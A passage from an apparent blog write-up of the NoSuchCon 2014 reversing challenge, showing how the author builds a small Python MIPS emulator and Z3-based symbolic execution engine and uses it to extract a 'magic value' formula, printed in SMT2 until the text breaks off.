<p>Anyway, after this long theoretical speech let&rsquo;s have a look at some code. The first important job of the engine is to be able to parse MIPS assembly: fortunately for us this is really easy. We are directly feeding plain-text MIPS disassembly directly copied from IDA to our engine:</p>

<p>```python <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#109;&#x69;&#x6e;&#105;&#x5f;&#109;&#x69;&#x70;&#x73;&#x5f;&#x73;&#x79;&#x6d;&#101;&#120;&#101;&#x63;&#95;&#x65;&#x6e;&#x67;&#x69;&#x6e;&#x65;&#46;&#112;&#x79;&#x40;&#77;&#105;&#x6e;&#x69;&#x4d;&#x69;&#x70;&#x73;&#83;&#x79;&#x6d;&#x45;&#120;&#x65;&#x63;&#69;&#110;&#x67;&#x69;&#x6e;&#x65;&#46;&#x5f;&#112;&#x61;&#x72;&#x73;&#x65;&#95;&#108;&#105;&#110;&#101;">&#109;&#x69;&#x6e;&#105;&#95;&#x6d;&#105;&#112;&#115;&#x5f;&#x73;&#121;&#x6d;&#101;&#120;&#x65;&#x63;&#95;&#x65;&#x6e;&#x67;&#105;&#110;&#101;&#46;&#112;&#x79;&#64;&#x4d;&#x69;&#110;&#105;&#x4d;&#105;&#x70;&#115;&#x53;&#x79;&#x6d;&#x45;&#120;&#x65;&#99;&#69;&#110;&#103;&#x69;&#110;&#101;&#x2e;&#95;&#x70;&#97;&#114;&#115;&#x65;&#x5f;&#108;&#105;&#110;&#101;</a>
def _parse_line(self, line):
  addr_seg, instr, rest = line.split(None, 2)
  args = rest.split(&lsquo;,&rsquo;)
  for i in range(len(args)):</p>

<pre><code>if '#' in args[i]:
    args[i], _ = args[i].split(None, 1)
</code></pre>

<p>  a0, a1, a2 = map(</p>

<pre><code>lambda x: x.strip().replace('$', '') if x is not None else x,
args + [None]*(3 - len(args))
</code></pre>

<p>  )
  _, addr = addr_seg.split(&lsquo;:&rsquo;)
  return int(addr, 16), instr, a0, a1, a2
```</p>

<p>From here you have all the information you need: the instruction and its operands (<em>None</em> if an operand doesn&rsquo;t exist as you can have up to 3 operands). The other important job that follows is to handle the different type of operands ; here are the ones I encountered in the challenge:</p>

<ul>
<li>General purpose register,</li>
<li>Stack-variable,</li>
<li>Immediate value.</li>
</ul>


<p>To handle / convert those I created a bunch of dull / helper functions:</p>

<p>`&ldquo;python mini_mips_symexec_engine.py@MiniMipsSymExecEngine.<em>is</em>*
def _is_gpr(self, x):
  &rdquo;&lsquo;Is it a valid GPR name?&rsquo;&lsquo;&rsquo;
  return x in self.gpr</p>

<p>def <em>is_imm(self, x):
  &lsquo;&rsquo;&lsquo;Is it a valid immediate?&rsquo;&lsquo;&rsquo;
  x = x.replace(&lsquo;loc</em>&rsquo;, &lsquo;0x&rsquo;)
  try:</p>

<pre><code>int(x, 0)
return True
</code></pre>

<p>  except:</p>

<pre><code>return False
</code></pre>

<p>def <em>to_imm(self, x):
  &lsquo;&rsquo;&lsquo;Get an integer from a string immediate&rsquo;&lsquo;&rsquo;
  if self.</em>is_imm(x):</p>

<pre><code>x = x.replace('loc_', '0x')
return int(x, 0)
</code></pre>

<p>  return None</p>

<p>def _is_memderef(self, x):
  &lsquo;&rsquo;&lsquo;Is it a memory dereference?&rsquo;&lsquo;&rsquo;
  return &lsquo;(&rsquo; in x and &lsquo;)&rsquo; in x</p>

<p>def is_stackvar(self, x):
  &lsquo;&rsquo;&lsquo;Is is a stack variable?&rsquo;&lsquo;&rsquo;
  return (&lsquo;(fp)&rsquo; in x and &lsquo;+&rsquo; in x) or (&lsquo;var_&rsquo; in x and &lsquo;+&rsquo; in x)</p>

<p>def to_stackvar(self, x):
  &lsquo;&rsquo;&lsquo;Get the stack variable name&rsquo;&lsquo;&rsquo;
  _, var_name = x.split(&lsquo;+&rsquo;)
  return var_name.replace(&lsquo;(fp)&rsquo;, &lsquo;&rsquo;)
```</p>

<p>Finally, we have to handle every different instructions and their encodings. Of course, you need to implement only the instructions you want: most likely the ones that are used in the code you are interested int. In a nutshell, this is the core of the engine. You can also use it to output valid Python/C lines if you fancy having a decompiler in your sleeve ; might be handy right?</p>

<p>This is what the core function looks like, it is really simple, dumb and so unoptimized ; but at least it&rsquo;s clear to me:</p>

<p>`&ldquo;python mini_mips_symexec_engine.py@step
def step(self):
  &rdquo;&lsquo;This is the core of the engine &mdash; you are supposed to implement the semantics
  of all the instructions you want to emulate here.&rsquo;&lsquo;&rsquo;
  line = self.code[self.pc]
  addr, instr, a0, a1, a2 = self._parse_line(line)
  if instr == &lsquo;sw&rsquo;:</p>

<pre><code>if self._is_gpr(a0) and self.is_stackvar(a1) and a2 is None:
  var_name = self.to_stackvar(a1)
  self.logger.info('%s = $%s', var_name, a0)
  self.stack[var_name] = self.gpr[a0]
elif self._is_gpr(a0) and self._is_memderef(a1) and a2 is None:
  idx, base = a1.split('(')
  base = base.replace('$', '').replace(')', '')
  computed_address = self.gpr[base] + self._to_imm(idx)
  self.logger.info('[%s + %s] = $%s', base, idx, a0)
  self.mem[computed_address] = self.gpr[a0]
else:
  raise Exception('sw not implemented')
</code></pre>

<p>  elif instr == &lsquo;lw&rsquo;:</p>

<pre><code>if self._is_gpr(a0) and self.is_stackvar(a1) and a2 is None:
  var_name = self.to_stackvar(a1)
  if var_name not in self.stack:
    self.logger.info(' WARNING: Assuming %s was 0', (var_name, ))
    self.stack[var_name] = 0
  self.logger.info('$%s = %s', a0, var_name)
  self.gpr[a0] = self.stack[var_name]
elif self._is_gpr(a0) and self._is_memderef(a1) and a2 is None:
  idx, base = a1.split('(')
  base = base.replace('$', '').replace(')', '')
  computed_address = self.gpr[base] + self._to_imm(idx)
  if computed_address not in self.mem:
    value = raw_input(' WARNING %.8x is not in your memory store -- what value is there @0x%.8x?' % (computed_address, computed_address))
  else:
    value = self.mem[computed_address]
  self.logger.info('$%s = [%s+%s]', a0, idx, base)
  self.gpr[a0] = value
else:
  raise Exception('lw not implemented')
</code></pre>

<p>[&hellip;]
```</p>

<p>The first level of <em>if</em> handles the different instructions, the second level of <em>if</em> handles the different encodings an instruction can have. The <em>self.logger</em> thingy is just my way to save the execution traces in files to let the console clean:</p>

<p>```python mini_mips_symexec_engine.py@<strong>init</strong>
def <strong>init</strong>(self, trace_name):
  self.gpr = {</p>

<pre><code>'zero' : 0,
'at' : 0,
'v0' : 0,
'v1' : 0,
</code></pre>

<h1>[&hellip;]</h1>

<pre><code>'lo' : 0,
'hi' : 0
</code></pre>

<p>  }</p>

<p>  self.stack = {}
  self.pc = 0
  self.code = []
  self.mem = {}
  self.stack_offsets = {}
  self.debug = False
  self.enable_z3 = False</p>

<p>  if os.path.exists(&lsquo;traces&rsquo;) == False:</p>

<pre><code>  os.mkdir('traces')
</code></pre>

<p>  self.logger = logging.getLogger(trace_name)
  h = logging.FileHandler(</p>

<pre><code>  os.path.join('traces', trace_name),
  mode = 'w'
</code></pre>

<p>  )</p>

<p>  h.setFormatter(</p>

<pre><code>  logging.Formatter(
      '%(levelname)s: %(asctime)s %(funcName)s @ l%(lineno)d -- %(message)s',
      datefmt = '%Y-%m-%d %H:%M:%S'
  )
</code></pre>

<p>  )</p>

<p>  self.logger.setLevel(logging.INFO)
  self.logger.addHandler(h)
```</p>

<p>At that point, if I wanted only an emulator I would be done. But because I want to use <a href="https://z3.codeplex.com/">Z3</a> and symbolic variables I want to get your attention on two common pitfalls that can cost you hours of debugging (trust me on that one :&ndash;():</p>

<ul>
<li>The first one is that the operator <em>__rshift__</em> isn&rsquo;t the logical right shift but the arithmetical one; which is quite different and can generate results you don&rsquo;t expect:</li>
</ul>


<p>```python LShR VS >>
In [1]: from z3 import *</p>

<p>In [2]: simplify(BitVecVal(4, 3) >> 1)
Out[2]: 6</p>

<p>In [3]: simplify(LShR(BitVecVal(4, 3), 1))
Out[3]: 2</p>

<p>In [4]: 4 >> 1
Out[4]: 2
```
  To workaround that I usually define my own <em>_LShR</em> function that does whatever is correct according to the operand types (yes we could also replace <em>z3.BitVecNumRef.__rshift__</em> by <em>LShR</em> directly):</p>

<p>`&ldquo;python mini_mips_symexec_engine@<em>LShR
def </em>LShR(self, a, b):
  &rdquo;&lsquo;Useful hook function if you want to run the emulation
  with/without Z3 as LShR is different from >> in Z3&rsquo;&lsquo;&rsquo;
  if self.enable_z3:</p>

<pre><code>if isinstance(a, long) or isinstance(a, int):
  a = BitVecVal(a, 32)
if isinstance(b, long) or isinstance(b, int):
  b = BitVecVal(b, 32)
return LShR(a, b)
</code></pre>

<p>  return a >> b
```</p>

<ul>
<li>The other interesting detail to keep in mind is that you can&rsquo;t have any overflow on <em>BitVec</em>s of the same size ; the result is automatically truncated. So if you happen to have mathematical operations that need to overflow, like a multiplication (this is used in the challenge), you should store the temporary result in a bigger temporary variable. In my case, I was supposed to store the overflow inside another register, <em>$hi</em> which is used to store the high <em>DWORD</em> part of the result. But because I wasn&rsquo;t storing the result in a bigger <em>BitVec</em>, <em>$hi</em> ended up <strong>always</strong> equal to zero which is quite a nice problem when you have to pinpoint this issue in thousands lines of assembly :&ndash;).</li>
</ul>


<p>```python mini_mips_symexec_engine@step@multu
elif instr == &lsquo;multu&rsquo;:
  if self.<em>is_gpr(a0) and self.</em>is_gpr(a1) and a2 is None:</p>

<pre><code>self.logger.info('$lo = ($%s * $%s) &amp; 0xffffffff', a0, a1)
self.logger.info('$hi = ($%s * $%s) &gt;&gt; 32', a0, a1)
if self.enable_z3:
  a0bis, a1bis = self.gpr[a0], self.gpr[a1]
  if isinstance(a0bis, int) or isinstance(a0bis, long):
    a0bis = BitVecVal(a0bis, 32)
  if isinstance(a1bis, int) or isinstance(a1bis, long):
    a1bis = BitVecVal(a1bis, 32)

  a064 = ZeroExt(32, a0bis)
  a164 = ZeroExt(32, a1bis)
  r = a064 * a164
  self.gpr['lo'] = Extract(31, 0, r)
  self.gpr['hi'] = Extract(63, 32, r)
</code></pre>

<p>  else:</p>

<pre><code>x = self.gpr[a0] * self.gpr[a1]
self.gpr['lo'] = x &amp; 0xffffffff
self.gpr['hi'] = self._LShR(x, 32)
</code></pre>

<p>```</p>

<p>I think this is it really, you can now impress girls with your brand new shiny toy, check this out:</p>

<p>```python mini_mips_symexec_engine@main
def main(argc, argv):</p>

<pre><code>print '=' * 50
sym = MiniMipsSymExecEngine('donotcare.log')
# DO NOT FORGET TO ENABLE Z3 :)
sym.enable_z3 = True
a = BitVec('a', 32)
sym.stack['var'] = a
sym.stack['var2'] = 0xdeadbeef
sym.stack['var3'] = 0x31337
sym.code = '''.doare:DEADBEEF                 lw      $v0, 0x318+var($fp)  # Load Word
</code></pre>

<p>.doare:DEADBEEF                 lw      $v1, 0x318+var2($fp)  # Load Word
.doare:DEADBEEF                 subu    $v0, $v1, $v0    #
.doare:DEADBEEF                 li      $v1, 0x446F8657  # Load Immediate
.doare:DEADBEEF                 multu   $v0, $v1         # Multiply Unsigned
.doare:DEADBEEF                 mfhi    $v1              # Move From HI
.doare:DEADBEEF                 subu    $v0, $v1         # Subtract Unsigned'&lsquo;&rsquo;.split(&lsquo;\n&rsquo;)</p>

<pre><code>sym.run()

print 'Symbolic mode:'
print 'Resulting equation: %r' % sym.gpr['v0']
print 'Resulting value if `a` is 0xdeadb44: %#.8x' % substitute(
    sym.gpr['v0'], (a, BitVecVal(0xdeadb44, 32))
).as_long()

print '=' * 50
emu = MiniMipsSymExecEngine('donotcare.log')
emu.stack = sym.stack
emu.stack['var'] = 0xdeadb44
sym.stack['var2'] = 0xdeadbeef
sym.stack['var3'] = 0x31337
emu.code = sym.code
emu.run()

print 'Emulator mode:'
print 'Resulting value when `a` is 0xdeadb44: %#.8x' % emu.gpr['v0']
print '=' * 50
return 1
</code></pre>

<p>```</p>

<p>Which results in:</p>

<p>```text w00t, emu &amp; symbolic execution works</p>

<h1>PS D:\Codes\NoSuchCon2014> python .\mini_mips_symexec_engine.py</h1>

<p>Symbolic mode:
Resulting equation: 3735928559 +
4294967295<em>a +
4294967295</em>
Extract(63,</p>

<pre><code>    32,
    1148159575*Concat(0, 3735928559 + 4294967295*a))
</code></pre>

<h1>Resulting value if <code>a</code> is 0xdeadb44: 0x98f42d24</h1>

<p>Emulator mode:</p>

<h1>Resulting value when <code>a</code> is 0xdeadb44: 0x98f42d24</h1>

<p>```</p>

<p>Of course, I didn&rsquo;t mention a lot of details that still need to be addressed to have something working: simulating data areas, memory layouts, etc. If you are interested in those, you should read the codes in my <a href="https://github.com/0vercl0k/stuffz/tree/master/NoSuchCon2014">NoSuchCon2014 folder</a>.</p>

<h2>Back into the battlefield</h2>

<p>Here comes the important bits!</p>

<h3>Extracting the function that generates the magic value from the son program counter</h3>

<p>All right, the main objective in this part is to extract the formula that generates the first magic value. As we said earlier, this big block can be seen as a function that takes two arguments (or symbolic variables) and generates the <em>magic DWORD</em> in output. The first thing to do is to copy the code somewhere to feed it to our engine ; I decided to stick all the codes I needed into a separate Python file called <em>code.py</em>.
<code>python code.py
block_generate_magic_from_pc_son = '''.text:00400B8C                 lw      $v0, 0x318+pc_son($fp)  # Load Word
.text:00400B90                 sw      $v0, 0x318+tmp_pc($fp)  # Store Word
.text:00400B94                 la      $v0, loc_400A78  # Load Address
.text:00400B9C                 lw      $v1, 0x318+tmp_pc($fp)  # Load Word
.text:00400BA0                 subu    $v0, $v1, $v0    # (regs.pc_father - 400A78)
.text:00400BA4                 sw      $v0, 0x318+tmp_pc($fp)  # Store Word
.text:00400BA8                 lw      $v0, 0x318+var_300($fp)  # Load Word
.text:00400BAC                 li      $v1, 0x446F8657  # Load Immediate
.text:00400BB4                 multu   $v0, $v1         # Multiply Unsigned
.text:00400BB8                 mfhi    $v1              # Move From HI
.text:00400BBC                 subu    $v0, $v1         # Subtract Unsigned
[...]
.text:00401424                 lw      $v0, 0x318+var_2F0($fp)  # Load Word
.text:00401428                 nor     $v0, $zero, $v0  # NOR
.text:0040142C                 addiu   $v0, 0x20        # Add Immediate Unsigned
.text:00401430                 lw      $a0, 0x318+tmp_pc($fp)  # Load Word
.text:00401434                 sllv    $v0, $a0, $v0    # Shift Left Logical Variable
.text:00401438                 or      $v0, $v1, $v0    # OR
.text:0040143C                 sw      $v0, 0x318+tmp_pc($fp)  # Store Word'''.split('\n')
</code>
Then we have to prepare the environment of our engine: the two symbolic variables are stack-variables, so we have to insert them in the context of our virtual environment. The resulting formula is going to be in <em>$v0</em> at the end of the execution ; this the holy grail, the formula we are after.</p>

<p>`&ldquo;python solve_nsc2014_step1_z3.py@extract_equation_of_function_that_generates_magic_value
def extract_equation_of_function_that_generates_magic_value():
  &rdquo;&lsquo;Here we do some magic to transform our mini MIPS emulator
  into a symbolic execution engine ; the purpose is to extract
  the formula of the function generating the 32-bits magic value&rsquo;&lsquo;&rsquo;</p>

<p>  x = mini_mips_symexec_engine.MiniMipsSymExecEngine(&lsquo;function_that_generates_magic_value.log&rsquo;)
  x.debug = False
  x.enable_z3 = True
  pc_son = BitVec(&lsquo;pc_son&rsquo;, 32)
  n_break = BitVec(&lsquo;n_break&rsquo;, 32)
  x.stack[&lsquo;pc_son&rsquo;] =  pc_son
  x.stack[&lsquo;var_300&rsquo;] = n_break
  emu_generate_magic_from_son_pc(x, print_final_state = False)
  compute_magic_equation = x.gpr[&lsquo;v0&rsquo;]
  with open(os.path.join(&lsquo;formulas&rsquo;, &lsquo;generate_magic_value_from_pc_son.smt2&rsquo;), &lsquo;w&rsquo;) as f:</p>

<pre><code>f.write(to_SMT2(compute_magic_equation, name = 'generate_magic_from_pc_son'))
</code></pre>

<p>  return pc_son, n_break, simplify(compute_magic_equation)
```</p>

<p>You can now keep in memory the formula &amp; wrap this function in another one so that you can reuse it every time you need it:</p>

<p>`&ldquo;python solve_nsc2014_step1_z3.py@generate_magic_from_son_pc_using_z3
var_magic, var_n_break, expr_magic = [None]*3
def generate_magic_from_son_pc_using_z3(pc_son, n_break):
  &rdquo;&lsquo;Generates the 32 bits magic value thanks to the output
  of the symbolic execution engine: run the analysis once, extract
  the complete equation &amp; reuse it as much as you want&rsquo;&lsquo;&rsquo;
  global var_magic, var_n_break, expr_magic
  if var_magic is None and var_n_break is None and expr_magic is None:</p>

<pre><code>var_magic, var_n_break, expr_magic = extract_equation_of_function_that_generates_magic_value()
</code></pre>

<p>  return substitute(</p>

<pre><code>expr_magic,
(var_magic, BitVecVal(pc_son, 32)),
(var_n_break, BitVecVal(n_break, 32))
</code></pre>

<p>  ).as_long()
```</p>

<p>The power of using symbolic variables here lies in the fact that we don&rsquo;t need to run the emulator every single time you need to call this function ; you get once the generic formula and you just have to substitute the symbolic variables by the concrete values you want. This comes for free with our code, so let&rsquo;s use it heh :&ndash;).</p>

<p><code>text resulting formula in SMT2 format
; generate_magic_from_pc_son
(declare-fun n_break () (_ BitVec 32))
(declare-fun pc_son () (_ BitVec 32))
(let ((?x14 (bvadd n_break (bvmul (_ bv4294967295 32) ((_ extract 63 32) (bvmul (_ bv1148159575 64) (concat (_ bv0 32) n_break)))))))
(let ((?x21 ((_ extract 63 32) (bvmul (_ bv1148159575 64) (concat (_ bv0 32) n_break)))))
(let ((?x8 (bvadd ?x21 (concat (_ bv0 1) ((_ extract 31 1) ?x14)))))
(let ((?x26 ((_ extract 31 6) ?x8)))
(let ((?x24 (bvadd (_ bv32 32) (concat (_ bv63 6) (bvnot ?x26)))))
(let ((?x27 (concat (_ bv0 6) ?x26)))
(let ((?x42 (bvmul (_ bv4294967295 32) ?x27)))
(let ((?x67 ((_ extract 6 6) ?x8)))
(let ((?x120 ((_ extract 7 6) ?x8)))
(let ((?x38 (concat (bvadd (_ bv30088 15) ((_ extract 14 0) pc_son)) ((_ extract 31 15) (bvadd (_ bv4290770312 32) pc_son)))))
(let ((?x41 (bvxor (bvadd (bvor (bvlshr ?x38 (bvadd (_ bv1 32) ?x27)) (bvshl ?x38 ?x24)) ?x42) ?x27)))
(let ((?x63 (bvor ((_ extract 0 0) (bvlshr ?x38 (bvadd (_ bv1 32) ?x27))) ((_ extract 0 0) (bvshl ?x38 ?x24)))))
(let ((?x56 (concat (bvadd (_ bv1 1) (bvxor (bvadd ?x63 ?x67) ?x67)) ((_ extract 31 1) (bvadd (_ bv2142377237 32) ?x41)))))
(let ((?x66 (concat (bvadd ((_ extract 9 1) (bvadd (_ bv2142377237 32) ?x41)) ((_ extract 14 6) ?x8)) ((_ extract 31 31) (bvadd ?x56 ?x27)) ((_ extract 30 9) (bvadd ((_ extract 31 1) (bvadd (_ bv2142377237 32) ?x41)) (concat (_ bv0 5) ?x26))))))
(let ((?x118 (bvor ((_ extract 1 0) (bvshl ?x66 (bvadd (_ bv1 32) ?x27))) ((_ extract 1 0) (bvlshr ?x66 ?x24)))))
(let ((?x122 (bvnot (bvadd ?x118 ?x120))))
(let ((?x45 (bvadd (bvor (bvshl ?x66 (bvadd (_ bv1 32) ?x27)) (bvlshr ?x66 ?x24)) ?x27)))
(let ((?x76 ((_ extract 4 2) ?x45)))
(let ((?x110 (bvnot ((_ extract 5 5) ?x45))))
(let ((?x55 ((_ extract 8 6) ?x45)))
(let ((?x108 (bvnot ((_ extract 10 9) ?x45))))
(let ((?x78 ((_ extract 13 11) ?x45)))
(let ((?x106 (bvnot ((_ extract 14 14) ?x45))))
(let ((?x80 ((_ extract 15 15) ?x45)))
(let ((?x104 (bvnot ((_ extract 16 16) ?x45))))
(let ((?x123 (concat (bvnot ((_ extract 31 29) ?x45)) ((_ extract 28 28) ?x45) (bvnot ((_ extract 27 27) ?x45)) ((_ extract 26 26) ?x45) (bvnot ((_ extract 25 25) ?x45)) ((_ extract 24 24) ?x45) (bvnot ((_ extract 23 21) ?x45)) ((_ extract 20 20) ?x45) (bvnot ((_ extract 19 18) ?x45)) ((_ extract 17 17) ?x45) ?x104 ?x80 ?x106 ?x78 ?x108 ?x55 ?x110 ?x76 ?x122)))
(let ((?x50 (concat (bvnot ((_ extract 30 29) ?x45)) ((_ extract 28 28) ?x45) (bvnot ((_ extract 27 27) ?x45)) ((_ extract 26 26) ?x45) (bvnot ((_ extract 25 25) ?x45)) ((_ extract 24 24) ?x45) (bvnot ((_ extract 23 21) ?x45)) ((_ extract 20 20) ?x45) (bvnot ((_ extract 19 18) ?x45)) ((_ extract 17 17) ?x45) ?x104 ?x80 ?x106 ?x78 ?x108 ?x55 ?x110 ?x76 ?x122)))
(let ((?x91 (bvadd (_ bv1720220585 32) (concat (bvnot (bvadd (_ bv612234822 31) ?x50)) (bvnot ((_ extract 31 31) (bvadd (_ bv612234822 32) ?x123)))) ?x42)))
(let ((?x137 (bvnot (bvadd (_ bv128582 17) (concat ?x104 ?x80 ?x106 ?x78 ?x108 ?x55 ?x110 ?x76 ?x122)))))
(let ((?x146 (bvadd (_ bv31657 18) (concat ?x137 (bvnot ((_ extract 31 31) (bvadd (_ bv612234822 32) ?x123)))) (bvmul (_ bv262143 18) ((_ extract 23 6) ?x8)))))
(let ((?x131 (bvadd (_ bv2800103692 32) (concat ?x146 ((_ extract 31 18) ?x91)))))
(let ((?x140 (concat ((_ extract 18 18) ?x91) ((_ extract 31 31) ?x131) (bvnot ((_ extract 30 30) ?x131)) ((_ extract 29 27) ?x131) (bvnot ((_ extract 26 25) ?x131)) ((_ extract 24 24) ?x131) (bvnot ((_ extract 23 22) ?x131)) ((_ extract 21 21) ?x131) (bvnot ((_ extract 20 20) ?x131)) ((_ extract 19 19) ?x131) (bvnot ((_ extract 18 17) ?x131)) ((_ extract 16 14) ?x131) (bvnot ((_ extract 13 9) ?x131)) ((_ extract 8 8) ?x131) (bvnot ((_ extract 7 6) ?x131)) ((_ extract 5 4) ?x131) (bvnot ((_ extract 3 1) ?x131)))))
(let ((?x176 (bvnot (bvadd (concat ((_ extract 4 4) ?x131) (bvnot ((_ extract 3 1) ?x131))) ((_ extract 9 6) ?x8)))))
(let ((?x177 (bvadd (concat ?x176 (bvnot ((_ extract 31 4) (bvadd ?x140 ?x27)))) ?x42)))
(let ((?x187 (bvadd (bvnot ((_ extract 13 4) (bvadd ?x140 ?x27))) (bvmul (_ bv1023 10) ((_ extract 15 6) ?x8)))))
(let ((?x180 (concat (bvadd ((_ extract 23 10) ?x177) (bvmul (_ bv16383 14) ((_ extract 19 6) ?x8))) ((_ extract 31 14) (bvadd (concat ?x187 ((_ extract 31 10) ?x177)) ?x42)))))
(let ((?x79 (bvadd (bvxor (bvadd ?x180 ?x27) ?x27) ?x42)))
(let ((?x211 (concat (bvadd ((_ extract 17 10) ?x177) (bvmul (_ bv255 8) ((_ extract 13 6) ?x8))) ((_ extract 31 14) (bvadd (concat ?x187 ((_ extract 31 10) ?x177)) ?x42)))))
(let ((?x190 (concat (bvnot (bvadd (bvxor (bvadd ?x211 ?x26) ?x26) (bvmul (_ bv67108863 26) ?x26))) (bvnot ((_ extract 31 26) ?x79)))))
(let ((?x173 (bvadd (bvnot (bvadd (_ bv3113082326 32) ?x190 ?x27)) ?x27)))
(let ((?x174 ((_ extract 9 6) ?x8)))
(let ((?x255 ((_ extract 2 2) (bvadd (bvnot (bvadd (_ bv6 4) (bvnot ((_ extract 29 26) ?x79)) ?x174)) ?x174))))
(let ((?x253 ((_ extract 3 3) (bvadd (bvnot (bvadd (_ bv6 4) (bvnot ((_ extract 29 26) ?x79)) ?x174)) ?x174))))
(let ((?x144 ((_ extract 23 6) ?x8)))
(let ((?x233 ((_ extract 17 6) ?x8)))
(let ((?x235 (bvxor (bvadd ((_ extract 25 14) (bvadd (concat ?x187 ((_ extract 31 10) ?x177)) ?x42)) ?x233) ?x233)))
(let ((?x244 (bvadd (_ bv122326 18) (concat (bvnot (bvadd ?x235 (bvmul (_ bv4095 12) ?x233))) (bvnot ((_ extract 31 26) ?x79))) ?x144)))
(let ((?x246 (bvadd (bvnot ?x244) ?x144)))
(let ((?x293 (concat (bvnot ((_ extract 24 23) ?x173)) ((_ extract 22 18) ?x173) ((_ extract 17 17) ?x246) (bvnot ((_ extract 16 16) ?x246)) ((_ extract 15 15) ?x246) (bvnot ((_ extract 14 12) ?x246)) ((_ extract 11 10) ?x246) (bvnot ((_ extract 9 9) ?x246)) ((_ extract 8 8) ?x246) (bvnot ((_ extract 7 7) ?x246)) ((_ extract 6 6) ?x246) (bvnot ((_ extract 5 4) ?x246)) (bvnot ?x253) ?x255 (bvnot (bvadd (bvnot (bvadd (_ bv2 2) (bvnot ((_ extract 27 26) ?x79)) ?x120)) ?x120)) (bvnot ((_ extract 31 29) ?x173)) ((_ extract 28 28) ?x173) (bvnot ((_ extract 27 26) ?x173)) ((_ extract 25 25) ?x173))))
(let ((?x324 (bvor ((_ extract 0 0) (bvshl ?x293 (bvadd (_ bv1 32) ?x27))) ((_ extract 0 0) (bvlshr ?x293 ?x24)))))
(let ((?x202 (bvadd (bvor (bvshl ?x293 (bvadd (_ bv1 32) ?x27)) (bvlshr ?x293 ?x24)) ?x27)))
(let ((?x261 (concat ((_ extract 31 31) ?x202) (bvnot ((_ extract 30 29) ?x202)) ((_ extract 28 27) ?x202) (bvnot ((_ extract 26 25) ?x202)) ((_ extract 24 22) ?x202) (bvnot ((_ extract 21 18) ?x202)) ((_ extract 17 17) ?x202) (bvnot ((_ extract 16 15) ?x202)) ((_ extract 14 13) ?x202) (bvnot ((_ extract 12 12) ?x202)) ((_ extract 11 7) ?x202) (bvnot ((_ extract 6 5) ?x202)) ((_ extract 4 2) ?x202) (bvnot ((_ extract 1 1) ?x202)) (bvadd ?x324 ?x67))))
(let ((?x250 (concat ((_ extract 11 7) ?x202) (bvnot ((_ extract 6 5) ?x202)) ((_ extract 4 2) ?x202) (bvnot ((_ extract 1 1) ?x202)) (bvadd ?x324 ?x67))))
(let ((?x331 (bvadd (_ bv1397077939 32) (concat (bvadd (_ bv4018 12) ?x250) ((_ extract 31 12) (bvadd (_ bv1471406002 32) ?x261))) ?x27)))
(let ((?x264 (bvor (bvshl (bvadd (bvnot ?x331) ?x27) (bvadd (_ bv1 32) ?x27)) (bvlshr (bvadd (bvnot ?x331) ?x27) ?x24))))
(let ((?x298 (bvor (bvshl (bvadd (_ bv1031407080 32) ?x264 ?x42) (bvadd (_ bv1 32) ?x27)) (bvlshr (bvadd (_ bv1031407080 32) ?x264 ?x42) ?x24))))
(let ((?x231 (bvor ((_ extract 31 17) (bvshl ?x298 (bvadd (_ bv1 32) ?x27))) ((_ extract 31 17) (bvlshr ?x298 ?x24)))))
(let ((?x220 (bvor ((_ extract 16 0) (bvshl ?x298 (bvadd (_ bv1 32) ?x27))) ((_ extract 16 0) (bvlshr ?x298 ?x24)))))
(let ((?x283 (bvor (bvshl (concat ?x220 ?x231) (bvadd (_ bv1 32) ?x27)) (bvlshr (concat ?x220 ?x231) ?x24))))
(let ((?x119 (bvadd (_ bv4200859627 32) (bvnot (bvor (bvshl ?x283 (bvadd (_ bv1 32) ?x27)) (bvlshr ?x283 ?x24))))))
(let ((?x201 (bvshl ?x119 ?x24)))
(let ((?x405 (bvadd (bvor ((_ extract 10 8) (bvlshr ?x119 (bvadd (_ bv1 32) ?x27))) ((_ extract 10 8) ?x201)) ((_ extract 8 6) ?x8))))
(let ((?x343 (concat (bvor ((_ extract 7 0) (bvlshr ?x119 (bvadd (_ bv1 32) ?x27))) ((_ extract 7 0) ?x201)) (bvor ((_ extract 31 8) (bvlshr ?x119 (bvadd (_ bv1 32) ?x27))) ((_ extract 31 8) ?x201)))))
(let ((?x199 (bvadd (_ bv752876532 32) (bvnot (bvadd ?x343 ?x27)) ?x27)))
(let ((?x409 (concat ((_ extract 31 29) ?x199) (bvnot ((_ extract 28 28) ?x199)) ((_ extract 27 27) ?x199) (bvnot ((_ extract 26 26) ?x199)) ((_ extract 25 25) ?x199) (bvnot ((_ extract 24 24) ?x199)) ((_ extract 23 23) ?x199) (bvnot ((_ extract 22 22) ?x199)) ((_ extract 21 21) ?x199) (bvnot ((_ extract 20 19) ?x199)) ((_ extract 18 18) ?x199) (bvnot ((_ extract 17 17) ?x199)) ((_ extract 16 16) ?x199) (bvnot ((_ extract 15 15) ?x199)) ((_ extract 14 11) ?x199) (bvnot ((_ extract 10 10) ?x199)) ((_ extract 9 9) ?x199) (bvnot ((_ extract 8 7) ?x199)) ((_ extract 6 6) ?x199) (bvnot ((_ extract 5 4) ?x199)) ((_ extract 3 3) ?x199) (bvnot (bvadd (_ bv4 3) (bvnot ?x405) ((_ extract 8 6) ?x8))))))
(let ((?x342 (bvlshr (bvadd (_ bv330202175 32) ?x409) ?x24)))
(let ((?x20 (bvadd (_ bv1 32) ?x27)))
(let ((?x337 (bvshl (bvadd (_ bv330202175 32) ?x409) ?x20)))
(let ((?x354 (bvadd (_ bv651919116 32) (bvor ?x337 ?x342))))
(let ((?x414 (concat (bvnot ((_ extract 26 26) ?x354)) ((_ extract 25 25) ?x354) (bvnot ((_ extract 24 24) ?x354)) (bvnot ((_ extract 23 23) ?x354)) ((_ extract 22 22) ?x354) (bvnot ((_ extract 21 21) ?x354)) (bvnot ((_ extract 20 18) ?x354)) ((_ extract 17 13) ?x354) (bvnot ((_ extract 12 10) ?x354)) ((_ extract 9 8) ?x354) (bvnot ((_ extract 7 7) ?x354)) ((_ extract 6 5) ?x354) (bvnot ((_ extract 4 4) ?x354)) (bvnot ((_ extract 3 3) ?x354)) (bvnot ((_ extract 2 2) ?x354)) (bvor ((_ extract 1 1) ?x337) ((_ extract 1 1) ?x342)) (bvnot (bvor ((_ extract 0 0) ?x337) ((_ extract 0 0) ?x342))) (bvnot ((_ extract 31 31) ?x354)) ((_ extract 30 30) ?x354) (bvnot ((_ extract 29 28) ?x354)) ((_ extract 27 27) ?x354))))
